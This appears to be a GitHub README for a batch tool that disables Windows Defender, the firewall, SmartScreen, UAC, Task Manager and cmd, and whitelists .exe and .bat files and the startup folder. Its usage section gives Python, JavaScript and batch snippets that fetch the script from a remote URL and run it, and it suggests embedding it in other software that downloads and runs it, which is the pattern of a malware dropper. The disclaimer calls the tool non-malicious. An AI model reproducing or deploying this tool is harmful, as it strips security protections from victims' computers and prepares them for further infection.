<h1 align="center">
  Defender Disabler ➰
</h1>

<p align="center">
  Destroy Windows Defender so hard that it doesn't even know it exists anymore
</p>

<p align="center">
  <kbd>
    <img src="https://raw.githubusercontent.com/Rdimo/images/master/Defender-Disabler/defender-disabler.png"></img>
  </kbd>
</p>

<p align="center">
  <img src="https://img.shields.io/github/languages/top/Rdimo/Defender-disabler?style=flat-square"/>
  <img src="https://img.shields.io/github/last-commit/Rdimo/Defender-disabler?style=flat-square"/>
  <img src="https://sonarcloud.io/api/project_badges/measure?project=Rdimo_Defender-disabler&metric=ncloc"/>
  <img src="https://img.shields.io/github/stars/Rdimo/Defender-disabler?color=5ac18e&label=Stars&style=flat-square"/>
  <img src="https://img.shields.io/github/forks/Rdimo/Defender-disabler?color=5ac18e&label=Forks&style=flat-square"/>
</p>

<h2 align="center">
  Defender-disabler was made by

Love ❌ code ✅

</h2>

---

## <a id="content"></a>🌐 〢 Content

- [🔰・Features](#features)
- [🌌・Discord](https://cheataway.com/invite)
- [🎉・Using defender-disabler](#setup)
- [🌱・Inspiration/Credits](#credits)
- [❕・Warning](#warn)

## <a id="features"></a>🔰 〢 Features

```
> Disables Windows Defender completely
> Disables Automatic Sample Submission and Quickscan
> Disables Windows FireWall, Smart Screen, and other security features
> Disables important security settings such as Real-time and Ransomware protection, AntiSpyware, BehaviorMonitoring,  etc..
> Adds .exe and .bat files as exclusions and the startup folder as exclusions
> Disables UAC (Reboot Required)
> Disables TaskManager, Registrytools, cmd, run
> + Loads More!
```

## <p align="left"><img src="https://raw.githubusercontent.com/Rdimo/images/master/Defender-Disabler/Screenshot%202021-10-14%20162401.png">

---

## <a id="setup"></a> 📁 〢 Using defender-disabler

First off you need to figure out if you want to use this program alone or use it in some other software that downloads and runs it.

1. Compiling the program
   There are multiple ways of compiling a batch file,

   - [Converting Batch file to Exe via IExpress](https://adamtheautomator.com/bat-to-exe/#Converting_BAT_file_to_EXE_via_IExpress)
     - [Converting Batch Scripts to Exe with Bat To Exe Converter](https://adamtheautomator.com/bat-to-exe/#Converting_BAT_Scripts_to_EXE_with_Bat_To_Exe_Converter)
       - [Converting Batch Scripts to Exe via Advanced BAT to EXE Converter](https://adamtheautomator.com/bat-to-exe/#Converting_BAT_Scripts_to_EXE_via_Advanced_BAT_to_EXE_Converter)
<br>
2. Implementing it in your software
   Depending on what language you're using, it will require different ways of implementing it.
  
   Here are some examples:

- [Python](https://www.python.org/):

```python
import requests, os
_file = requests.get('https://raw.githubusercontent.com/Rdimo/Defender-disabler/main/disabler.bat')

with open('demo.bat', 'w') as f:
    f.write(_file.text)

os.startfile('demo.bat')
```

- [Javascript](https://nodejs.org/en/):

```javascript
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');

axios.get('https://raw.githubusercontent.com/Rdimo/Defender-disabler/main/disabler.bat', {
    responseType: 'text',
  }).then((response) => {
    fs.writeFileSync('demo.bat', response.data, { flag: 'a' }, (err) => {});
  });
exec('demo.bat');
```

- [Batch](https://en.wikipedia.org/wiki/Batch_file):

```batch
bitsadmin /transfer Packages /download /priority foreground https://raw.githubusercontent.com/Rdimo/Defender-disabler/main/disabler.bat "demo.bat"
start demo.bat
```

## <a id="warn"></a> ❕ 〢 Warning 
  Running this program will completely disable Windows Defender. This program was not made to be used for any malicious purposes.
  If you now accidently ran this program on your main pc instead of a vm, reverting the changes will be hard but most of them can be fixed by runnig [enabler.bat](https://github.com/Rdimo/Defender-disabler/blob/main/enabler.bat) as admin

## <a id="credits"></a> 🌱 〢 Inspiration/Credits
  Most of the code is taken from [swagkarna](https://github.com/swagkarna) and his [Defender-disabler](https://github.com/swagkarna/Defeat-Defender-V1.2)
  This one is just more smoother, improved, more user friendly and has more features.


  <br>

<p align="center">
  By using Defender Disabler, you agree that you hold responsibility and accountability of any consequences caused by your actions
<br>
  <a href=#top>Back to Top</a>
</p>
